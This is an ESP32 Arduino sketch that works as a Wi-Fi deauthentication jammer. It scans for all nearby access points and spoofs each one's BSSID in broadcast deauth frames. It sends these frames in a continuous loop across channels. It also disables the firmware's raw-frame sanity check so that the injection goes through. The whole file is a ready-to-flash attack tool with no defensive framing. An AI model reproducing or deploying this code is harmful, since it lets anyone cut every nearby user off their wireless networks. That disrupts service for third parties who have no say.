#include "esp_wifi.h"
#include "nvs_flash.h"
#include <esp_task_wdt.h>
#include <Arduino.h>
#include <map>
#include <vector>
#include <array>

struct info_thing {
  std::array<uint8_t, 6> bssid;
  uint8_t channel;
};

std::map<uint8_t, std::vector<info_thing>> apinfo;

void scan() {
  Serial.println(F("Scanning..."));
  digitalWrite(2, HIGH);
  wifi_scan_config_t scan_config = {
    .ssid = NULL,
    .bssid = NULL,
    .channel = 0,
    .show_hidden = true,
    .scan_type = WIFI_SCAN_TYPE_ACTIVE,
    .scan_time = { .active = { .min = 10, .max = 20 } }
  };
  ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
  uint16_t ap_num = 0;
  ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_num));
  apinfo.clear();
  Serial.printf("Total APs found: %d\n", ap_num);
  wifi_ap_record_t ap_records[ap_num];
  ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_num, ap_records));

  for (int i = 0; i < ap_num; i++) {
    wifi_ap_record_t ap = ap_records[i];
    Serial.printf("%d | SSID: %s, BSSID: %02x:%02x:%02x:%02x:%02x:%02x, Channel: %d, RSSI: %d, Authmode: %d\n", 
                  i, ap.ssid, 
                  ap.bssid[0], ap.bssid[1], ap.bssid[2], 
                  ap.bssid[3], ap.bssid[4], ap.bssid[5], 
                  ap.primary, ap.rssi, ap.authmode);

    info_thing info;
    std::copy(std::begin(ap.bssid), std::end(ap.bssid), info.bssid.begin());
    info.channel = ap.primary;

    apinfo[ap.primary].push_back(info);
  }
  digitalWrite(2, LOW);
}

uint8_t deauth_frame[26] = {
  0xc0, 0x00,   // Frame Control: deauth
  0x00, 0x00,   // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for Source (AP)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for BSSID (AP)
  0x00, 0x00,   // Sequence number
  0x02, 0x00    // Reason code: 7 (Class 3 frame received from nonassociated STA)
};

void sendDeauth(const uint8_t *bssid) {
  memcpy(&deauth_frame[10], bssid, 6);  // Source (AP)
  memcpy(&deauth_frame[16], bssid, 6);  // BSSID (AP)
  // Serial.printf("Sending deauth to BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false));
}

void setup() {
  Serial.begin(115200);
  esp_task_wdt_init(6000, false);
  pinMode(0, INPUT);
  pinMode(2, OUTPUT);
  nvs_flash_init();
  tcpip_adapter_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
  ESP_ERROR_CHECK(esp_wifi_start());
  scan();
}


// #define USE_FIXED_DELAY // comment this to automatically set the delay time,not recommended bc i think it will destroy esp32's mem if the ap num is too high
// #define SCAN_ONCE // ok i think u know what will this do
unsigned long previousMillis = 0;
const unsigned long interval = 30000; // 30s

void loop() {
  unsigned long currentMillis = millis();
  if ((currentMillis - previousMillis >= interval) || !digitalRead(0)) {
    previousMillis = currentMillis;
#ifndef SCAN_ONCE
    scan();
#endif
  }

  for (const auto& ap : apinfo) {
    uint8_t channel = ap.first;
    const std::vector<info_thing>& aps_in_channel = ap.second;
    
#ifdef USE_FIXED_DELAY
    uint32_t delayTime = 200 / aps_in_channel.size();
#else
  #define delayTime 750 // pls dont die my deer esp32
#endif

    for (const auto& ssidInfo : aps_in_channel) {
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      sendDeauth(ssidInfo.bssid.data());
      delayMicroseconds(delayTime);
    }
  }
}


extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {return 0;}